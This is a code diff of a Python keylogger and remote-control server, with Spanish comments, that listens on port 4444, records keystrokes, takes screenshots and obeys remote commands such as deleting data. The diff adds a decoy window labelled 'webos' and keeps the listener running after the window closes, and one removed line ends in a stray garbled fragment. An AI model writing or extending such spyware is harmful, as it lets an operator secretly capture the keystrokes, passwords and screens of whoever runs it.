@@ -1,10 +1,10 @@
 import socket
 import threading
 import os
-import time
 import datetime
 from pynput import keyboard
 from PIL import ImageGrab
+import tkinter as tk
 
 HOST = "0.0.0.0"
 PORT = 4444
@@ -12,10 +12,8 @@ LOG_FILE = "keylog.txt"
 SCREENSHOT_FILE = "screenshot.png"
 
 keylog_active = False
-log = []
 
 def save_log(key):
-    global keylog_active
     if not keylog_active:
         return
     try:
@@ -73,6 +71,9 @@ def handle_client(conn):
         elif data == "DELETE_ALL":
             response = delete_all()
             conn.sendall(response.encode())
+        elif data == "STOP":
+            conn.sendall(b"[Servidor se detiene]")
+            os._exit(0)
         else:
             conn.sendall(b"Comando desconocido")
 
@@ -83,7 +84,21 @@ def server_loop():
         print(f"[+] Esperando comandos en {HOST}:{PORT}...")
         while True:
             conn, addr = s.accept()
-            threading.Thread(target=handle_client, args=(conn,), daemon=True).start()
+            threading.Thread(target=handle_client, args=(conn,)).start()
+
+def launch_tk_window():
+    root = tk.Tk()
+    root.title("🧠")
+    root.geometry("300x100")
+    root.configure(bg="#111")
+
+    label = tk.Label(root, text="webos", fg="white", bg="#111", font=("Arial", 24))
+    label.pack(expand=True)
+
+    # No cerrar el servidor al cerrar la ventana
+    root.protocol("WM_DELETE_WINDOW", root.destroy)
+    root.mainloop()
 
 if __name__ == "__main__":
-    server_loop()nning on port 10000
+    threading.Thread(target=server_loop).start()  # Not daemon!
+    launch_tk_window()
